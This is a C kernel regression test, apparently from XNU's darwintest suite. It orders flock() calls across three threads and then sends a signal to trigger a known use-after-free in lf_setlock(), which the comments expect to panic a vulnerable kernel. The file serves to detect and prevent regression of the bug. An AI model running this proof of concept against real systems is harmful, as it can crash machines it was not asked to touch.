#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <darwintest.h>
#include <darwintest_utils.h>

T_GLOBAL_META(
	T_META_NAMESPACE("xnu.ipc"),
	T_META_RUN_CONCURRENTLY(TRUE));

#define TMP_FILE_NAME "lockf_uaf_poc_70587638"

static int fd0, fd1, fd2;

static int other_failure = 0;
static int other_failure_line = 0;

static pthread_t thr0, thr1, thr2;

#define RECORD_ERROR(err) do {                  \
	if (other_failure_line == 0) {          \
	        other_failure = (err);          \
	        other_failure_line = __LINE__;  \
	}                                       \
} while (0);
#define MYCHECK_ERRNO(res) do {                 \
	if ((res) < 0) {                        \
	        RECORD_ERROR((errno));          \
	        return NULL;                    \
	}                                                                       \
} while (0)
#define MYCHECK_POSIX(res) do {                 \
	if ((res) != 0) {                       \
	        RECORD_ERROR((res));            \
	        return NULL;                    \
	}                                       \
} while (0)

#define CHECK_OTHER_FAILURE() do {                      \
	int my_other_failure = other_failure;           \
	int my_other_failure_line = other_failure_line; \
	my_other_failure_line = 0;                      \
	T_QUIET;                                        \
	T_ASSERT_EQ(my_other_failure_line, 0,           \
	    "Other failure %d at line %d",              \
	    my_other_failure, my_other_failure_line);   \
} while (0);

static void *
thr2_func(void *arg)
{
	int res;

	/*
	 * Wait for thr1 to be blocking on attempting to acquire lock C. See the comment at the top of
	 * `thr1_func` for the reason why sleep is used.
	 */
	(void) sleep(1u);

	/*
	 * Acquire another shared lock (lock D) on the file. At this point the file has acquired 2
	 * locks; lock A and D which are both shared locks. It also has 2 exclusive locks currently
	 * blocking on lock A attempting to be acquired; lock B and C.
	 */
	res = flock(fd2, LOCK_SH);
	MYCHECK_ERRNO(res);

	/*
	 * Unlock lock A, this will cause the first lock blocking on lock A to be unblocked (lock B)
	 * and all other locks blocking on it to be moved to blocking on the first blocked lock
	 * (lock C will now be blocking on lock B). Lock B's thread will be woken up resulting in it
	 * trying to re-acquire the lock on the file, as lock D is on the same file descriptor and
	 * already acquired on the file it will be promoted to an exclusive lock and B will be freed
	 * instead. At this point all locks blocking on lock B (lock C in this case) will now have a
	 * reference to a freed allocation.
	 */
	res = flock(fd0, LOCK_UN);
	MYCHECK_ERRNO(res);

	return arg;
}

static void *
thr1_func(void *arg)
{
	int res;
	/*
	 * Wait for thr0 to be blocking on attempting to acquire lock B. Sleeping isn't great because
	 * it isn't an indication that the thread is blocked but I'm unsure how to detect a blocked
	 * thread programatically and a 1 second sleep has never failed so far of tests so for now that
	 * is what is done.
	 */
	(void) sleep(1u);

	// Another thread is required, spawn it now before blocking
	res = pthread_create(&thr2, 0, thr2_func, 0);
	MYCHECK_POSIX(res);

	// Block attempting to acquire an exclusive lock - lock C
	res = flock(fd1, LOCK_EX);
	MYCHECK_ERRNO(res);

	return arg;
}

static void *
thr0_func(void *arg)
{
	int res;

	// Acquire a shared lock - lock A
	res = flock(fd0, LOCK_SH);
	MYCHECK_ERRNO(res);

	// Another thread is required, spawn it now before blocking
	res = pthread_create(&thr1, 0, thr1_func, 0);
	MYCHECK_POSIX(res);

	// Block attempting to acquire an exclusive lock - lock B
	res = flock(fd2, LOCK_EX);
	MYCHECK_ERRNO(res);

	return arg;
}

static void
sigpipe_handler(int sig __unused, siginfo_t *sa __unused, void *ign __unused)
{
	return;
}

T_DECL(lockf_uaf_poc_70587638,
    "Do a sequence which caused lf_setlock() to free something still in-use.",
    T_META_ASROOT(true), T_META_CHECK_LEAKS(false))
{
	int res;
	struct sigaction sa;

	T_SETUPBEGIN;

	(void) sigfillset(&sa.sa_mask);
	sa.sa_sigaction = sigpipe_handler;
	sa.sa_flags = SA_SIGINFO;
	T_ASSERT_POSIX_SUCCESS(sigaction(SIGPIPE, &sa, NULL), "sigaction(SIGPIPE)");

	// Setup all the file descriptors needed (fd0's open makes sure the file exists)
	T_ASSERT_POSIX_SUCCESS(
		fd0 = open(TMP_FILE_NAME, O_RDONLY | O_CREAT, 0666),
		"open(\""TMP_FILE_NAME"\", O_RDONLY|O_CREAT, 0666)");
	T_ASSERT_POSIX_SUCCESS(
		fd1 = open(TMP_FILE_NAME, O_RDONLY, 0666),
		"open(\""TMP_FILE_NAME"\", O_RDONLY, 0666)");
	T_ASSERT_POSIX_SUCCESS(
		fd2 = open(TMP_FILE_NAME, 0, 0666),
		"open(\""TMP_FILE_NAME"\", O_RDONLY, 0666)");
	T_SETUPEND;

	/*
	 * Threads are used due to some locks blocking the thread when trying to acquire if a lock that
	 * blocks the requested lock already exists on the file. By using multiple threads there can be
	 * multiple locks blocking on attempting to acquire on a file.
	 */
	res = pthread_create(&thr0, 0, thr0_func, 0);
	T_ASSERT_POSIX_ZERO(res, "pthread_create thread 0");

	/*
	 * Wait for lock B to be acquired which under the hood actually results in lock D being
	 * promoted to an exclusive lock and lock B being freed. At this point the bug has been
	 * triggered leaving lock C with a dangling pointer to lock B.
	 */
	res = pthread_join(thr0, NULL);
	T_ASSERT_POSIX_ZERO(res, "pthread_join thread 0");

	CHECK_OTHER_FAILURE();

	// Trigger a signal to wake lock C from sleep causing it to do a UAF access on lock B
	res = pthread_kill(thr1, SIGPIPE);
	T_ASSERT_POSIX_ZERO(res, "pthread_kill thread 1");

	CHECK_OTHER_FAILURE();

	/*
	 * The kernel should panic at this point. This is just to prevent the
	 * application exiting before lock C's thread has woken from the signal.
	 * The application exiting isn't a problem but it will cause all the
	 * fd to be closed which will cause locks to be unlocked. This
	 * shouldn't prevent the PoC from working but its just cleaner to
	 * wait here for the kernel to panic rather than exiting the process.
	 */
	res = pthread_join(thr1, NULL);
	T_ASSERT_POSIX_ZERO(res, "pthread_join thread 1");

	CHECK_OTHER_FAILURE();

	T_PASS("lockf_uaf_poc_70587638");
}
